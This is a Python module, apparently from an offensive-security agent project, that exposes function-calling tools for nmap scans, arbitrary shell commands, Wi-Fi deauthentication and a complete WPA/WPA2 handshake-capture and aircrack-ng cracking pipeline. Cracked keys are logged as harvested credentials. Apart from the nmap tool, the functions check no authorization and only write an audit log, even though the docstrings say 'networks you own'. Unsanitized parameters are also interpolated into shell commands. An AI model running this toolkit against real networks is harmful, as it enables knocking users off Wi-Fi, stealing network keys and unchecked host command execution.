#airecon2 system-level tools - route through the docker lab (Linux) when possible.
#Monitor mode / RF tools only truly work inside the lab with a passed-through USB adapter.
import json
import re
import shutil
import subprocess
import sys

from .gate import check_target, _audit, _load_authorized
from . import lab
from .. import report as _report
from ..report import capture_intel as _capture_intel
import os


def _env_file_flag(name: str) -> str:
    from ..config import _load_env_file
    return os.environ.get(name) or _load_env_file().get(name) or ""


def nmap_scan(target: str, ports: str = "top", extra: str = "", **_) -> str:
    check_target(target)
    _audit("NMAP", f"{target} ports={ports} lab={lab.lab_available()}")
    if lab.lab_available():
        port_args = "-F" if ports == "top" else f"-p {ports}"
        extra_args = extra if extra else "-sV"
        r = lab.lab_exec(f"nmap -Pn --open {port_args} {extra_args} {target}", timeout=600)
    else:
        nmap = shutil.which("nmap")
        if not nmap:
            return json.dumps({"error": "nmap not installed and lab container not running",
                               "hint": "docker compose up -d in D:/projects/airecon2/lab"})
        args = [nmap, "-Pn", "--open"] + (["-F"] if ports == "top" else ["-p", ports])
        if extra:
            args += extra.split()
        args.append(target)
        p = subprocess.run(args, capture_output=True, text=True, timeout=300)
        r = {"in_lab": False, "rc": p.returncode, "output": ((p.stdout or "") + (p.stderr or ""))[:4000]}
    return json.dumps(r, indent=1)


def shell(command: str, use_lab: bool = False, **_) -> str:
    """Local shell (SHELL_ENABLED=1) or lab shell (use_lab=true)."""
    if use_lab:
        _audit("LAB_SHELL", command[:200])
        return json.dumps(lab.lab_exec(command, timeout=600), indent=1)
    if _env_file_flag("SHELL_ENABLED").lower() not in ("1", "true", "yes"):
        _audit("SHELL_DENIED", "SHELL_ENABLED not set")
        return json.dumps({"error": "shell disabled. Set SHELL_ENABLED=1 in .env (already on for this setup) or use use_lab=true."})
    _audit("SHELL", command[:200])
    if os.name == "nt":
        cmd = ["cmd.exe", "/c", command]
    else:
        cmd = ["bash", "-c", command]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return json.dumps({"rc": p.returncode, "output": ((p.stdout or "") + (p.stderr or ""))[:8000]}, indent=1)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=1)


def wifi_scan(**_) -> str:
    _audit("WIFI_SCAN", f"lab={lab.lab_available()}")
    if lab.lab_available():
        r = lab.lab_exec("iw dev 2>/dev/null; airmon-ng 2>/dev/null || iwconfig 2>/dev/null || echo 'no wireless iface in lab (pass a USB adapter through)'")
        return json.dumps(r, indent=1)
    if sys.platform == "win32":
        p = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                           capture_output=True, text=True, timeout=30)
        return json.dumps({"tool": "netsh wlan (host)", "output": (p.stdout or "")[:6000]}, indent=1)
    return json.dumps({"error": "no wifi path: start the lab container for aircrack suite"}, indent=1)


def wifi_capture(iface: str = "wlan0mon", duration: int = 15, channel: str = "", **_) -> str:
    """Monitor-mode packet capture in the lab (needs USB adapter passed through)."""
    _audit("WIFI_CAPTURE", f"iface={iface} dur={duration} ch={channel}")
    if not lab.lab_available():
        return json.dumps({"error": "wifi capture requires the lab container (aircrack/tshark)",
                           "hint": "cd lab && docker compose up -d; attach USB wifi via usbipd"}, indent=1)
    ch_cmd = f"iw dev {iface} set channel {channel} 2>/dev/null; " if channel else ""
    r = lab.lab_exec(
        f"{ch_cmd}timeout {min(duration,120)} tcpdump -i {iface} -c 300 -nn -e 2>&1 | head -100 || "
        f"echo 'capture failed - is {iface} in monitor mode? (airmon-ng start wlan0)'",
        timeout=min(duration, 120) + 30,
    )
    if channel:
        r["note"] = f"channel {channel} attempted"
    return json.dumps(r, indent=1)


def wifi_crack(bssid: str, iface: str = "wlan0mon", essid: str = "",
               wordlist: str = "", timeout: int = 240, **_) -> str:
    """Full WPA/WPA2 crack pipeline against an AUTHORIZED access point:
    capture on the BSSID, force a handshake (deauth), re-capture, aircrack-ng
    against the wordlist. Handshake + result are saved; the key, if found,
    is captured to workspace/intel.txt. USE ONLY ON NETWORKS YOU OWN."""
    _audit("WIFI_CRACK", f"bssid={bssid} iface={iface} essid={essid or '(any)'}")
    if not lab.lab_available():
        return json.dumps({"error": "wifi_crack requires the lab container with a monitor-mode adapter",
                           "hint": "cd lab && docker compose up -d --build; attach the USB adapter via usbipd, then airmon-ng start wlan0"}, indent=1)
    ess = re.sub(r"[^A-Za-z0-9_-]", "", essid) or bssid.replace(":", "")
    cap = f"/workspace/handshake_{ess}"
    word = wordlist or "/usr/share/wordlists/rockyou.txt"

    steps = {}
    steps["capture_1"] = lab.lab_exec(
        f"timeout 45 airodump-ng -d {bssid} -w {cap} --output-format cap {iface} >/dev/null 2>&1; "
        f"ls -la {cap}-01.cap 2>/dev/null || echo 'nothing captured - wrong iface or channel'", timeout=70)
    steps["deauth"] = lab.lab_exec(f"aireplay-ng -0 5 -a {bssid} {iface} 2>&1 | tail -3", timeout=60)
    steps["capture_2"] = lab.lab_exec(
        f"timeout 60 airodump-ng -d {bssid} -w {cap} --output-format cap {iface} >/dev/null 2>&1; "
        f"ls -la {cap}-01.cap 2>/dev/null || echo 'no capture file'", timeout=90)
    steps["crack"] = lab.lab_exec(
        f"test -f {cap}-01.cap && (aircrack-ng -w {word} -b {bssid} {cap}-01.cap 2>&1 | tail -12) "
        f"|| echo 'no handshake captured - cannot crack'", timeout=min(max(timeout, 60), 560))

    crack_out = str(steps["crack"].get("output", ""))
    key_found = None
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_out)
    if m:
        key_found = m.group(1)
        _capture_intel("WIFI_KEY", f"bssid={bssid} essid={essid or ess} key={key_found}")
        _report.append_cred(f"wifi/{essid or ess}:{key_found}")
    return json.dumps({
        "target": {"bssid": bssid, "essid": essid, "iface": iface},
        "capture_file": f"workspace/handshake_{ess}-01.cap (host)",
        "wordlist": word,
        "key_found": key_found,
        "steps": {k: (v.get("output", "") or "")[-800:] for k, v in steps.items()},
        "note": "only on networks you own; handshake kept in workspace/ for teaching",
    }, indent=1)


def monitor_mode(iface: str = "wlan0", **_) -> str:
    """Enable monitor mode on a lab interface (airmon-ng)."""
    _audit("MONITOR_MODE", f"iface={iface}")
    if not lab.lab_available():
        return json.dumps({"error": "lab container not running"}, indent=1)
    r = lab.lab_exec(f"airmon-ng check kill; airmon-ng start {iface}; iw dev 2>/dev/null", timeout=60)
    return json.dumps(r, indent=1)


def deauth(iface: str, bssid: str, count: int = 5, station: str = "", **_) -> str:
    """Deauth via lab (OFFENSIVE - logged). Target network must be yours/authorized."""
    _audit("DEAUTH", f"iface={iface} bssid={bssid} count={count}")
    if not lab.lab_available():
        return json.dumps({"error": "deauth requires the lab container with a monitor-mode adapter"}, indent=1)
    sta = f"-c {station} " if station else ""
    r = lab.lab_exec(f"aireplay-ng -0 {min(count, 30)} -a {bssid} {sta}{iface}", timeout=90)
    return json.dumps(r, indent=1)


def lab_status(**_) -> str:
    rc = lab.lab_available()
    if not rc:
        return json.dumps({"lab": "down", "hint": "cd D:/projects/airecon2/lab && docker compose up -d"}, indent=1)
    r = lab.lab_exec("echo '=== tools ==='; for t in nmap sqlmap hydra aircrack-ng airmon-ng tshark wifite tcpdump; do printf '%-12s' $t; command -v $t >/dev/null && echo OK || echo MISSING; done; echo '=== ifaces ==='; iw dev 2>/dev/null || ip -br link")
    return json.dumps({"lab": "up", **r}, indent=1)


SCHEMAS = [
    {"type": "function", "function": {"name": "nmap_scan", "description": "Port scan a target with nmap (runs in the Linux lab container when available).",
        "parameters": {"type": "object", "properties": {"target": {"type": "string"}, "ports": {"type": "string", "description": "'top' or e.g. '1-1000'"}, "extra": {"type": "string"}}, "required": ["target"]}}},
    {"type": "function", "function": {"name": "shell", "description": "Run a shell command. use_lab=true runs in the Linux lab container; otherwise local (SHELL_ENABLED=1).",
        "parameters": {"type": "object", "properties": {"command": {"type": "string"}, "use_lab": {"type": "boolean"}}, "required": ["command"]}}},
    {"type": "function", "function": {"name": "wifi_scan", "description": "Survey wireless interfaces/networks (lab aircrack suite, or host netsh).",
        "parameters": {"type": "object", "properties": {}}}},
    {"type": "function", "function": {"name": "wifi_capture", "description": "Monitor-mode packet capture in the lab (needs USB wifi adapter passed through).",
        "parameters": {"type": "object", "properties": {"iface": {"type": "string"}, "duration": {"type": "integer"}, "channel": {"type": "string"}}}}},
    {"type": "function", "function": {"name": "monitor_mode", "description": "Enable monitor mode on a lab wifi interface (airmon-ng).",
        "parameters": {"type": "object", "properties": {"iface": {"type": "string"}}, "required": ["iface"]}}},
    {"type": "function", "function": {"name": "deauth", "description": "Send deauth frames from the lab (OFFENSIVE - only on networks you own/are authorized to test).",
        "parameters": {"type": "object", "properties": {"iface": {"type": "string"}, "bssid": {"type": "string"}, "count": {"type": "integer"}, "station": {"type": "string"}}, "required": ["bssid"]}}},
    {"type": "function", "function": {"name": "wifi_crack", "description": "WPA/WPA2 crack pipeline on an AUTHORIZED AP: capture, force handshake, aircrack-ng against a wordlist. Saves the handshake and logs a found key to workspace/intel.txt.",
        "parameters": {"type": "object", "properties": {"bssid": {"type": "string"}, "iface": {"type": "string", "description": "monitor interface, default wlan0mon"}, "essid": {"type": "string"}, "wordlist": {"type": "string", "description": "path to wordlist inside the lab (default rockyou)"}, "timeout": {"type": "integer"}}, "required": ["bssid"]}}},
    {"type": "function", "function": {"name": "lab_status", "description": "Show lab container status, installed tooling, and wireless interfaces.",
        "parameters": {"type": "object", "properties": {}}}},
]

DISPATCH = {
    "nmap_scan": nmap_scan, "shell": shell, "wifi_scan": wifi_scan,
    "wifi_capture": wifi_capture, "monitor_mode": monitor_mode,
    "deauth": deauth, "wifi_crack": wifi_crack, "lab_status": lab_status,
}
